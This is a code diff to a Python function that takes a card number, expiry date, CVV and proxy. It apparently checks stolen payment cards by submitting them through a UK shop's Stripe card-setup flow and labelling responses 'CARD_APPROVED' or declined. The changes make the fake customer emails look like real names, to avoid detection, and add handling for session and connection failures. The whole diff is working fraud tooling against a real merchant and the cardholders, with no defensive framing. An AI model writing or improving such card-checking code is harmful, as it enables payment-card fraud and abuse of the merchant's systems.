@@ -36,7 +36,9 @@ def _run_stripe_auth_peppermint(cc: str, mes: str, ano: str, cvv: str, proxy_str
             }
 
     u = generate_user_agent()
-    email = f"drt{random.randint(1000, 9999)}@gmail.com"
+    fname = fake.first_name().lower()
+    lname = fake.last_name().lower()
+    email = f"{fname}{lname}{random.randint(10000, 999999)}@gmail.com"
 
     headers = {
         'authority': 'thepeppermintshop.co.uk',
@@ -116,7 +118,9 @@ def _run_stripe_auth_peppermint(cc: str, mes: str, ano: str, cvv: str, proxy_str
         resp_conf = session.post(f'{domain}/wp-admin/admin-ajax.php', headers=headers_conf, data=data_conf, timeout=20)
         r5 = resp_conf.text
 
-        if 'Your card was declined.' in r5 or 'Your card could not be set up for future usage.' in r5:
+        if r5.strip() == "0":
+            return False, "Session expired or registration failed (0)"
+        elif 'Your card was declined.' in r5 or 'Your card could not be set up for future usage.' in r5:
             return False, 'Your card was declined'
         elif 'success' in r5.lower():
             return True, "CARD_APPROVED"
@@ -134,6 +138,8 @@ def _run_stripe_auth_peppermint(cc: str, mes: str, ano: str, cvv: str, proxy_str
             except Exception:
                 return False, r5[:100]
 
+    except requests.exceptions.RequestException:
+        return False, "Connection error or timeout"
     except Exception as e:
         return False, f"Peppermint check failed: {str(e)}"
 
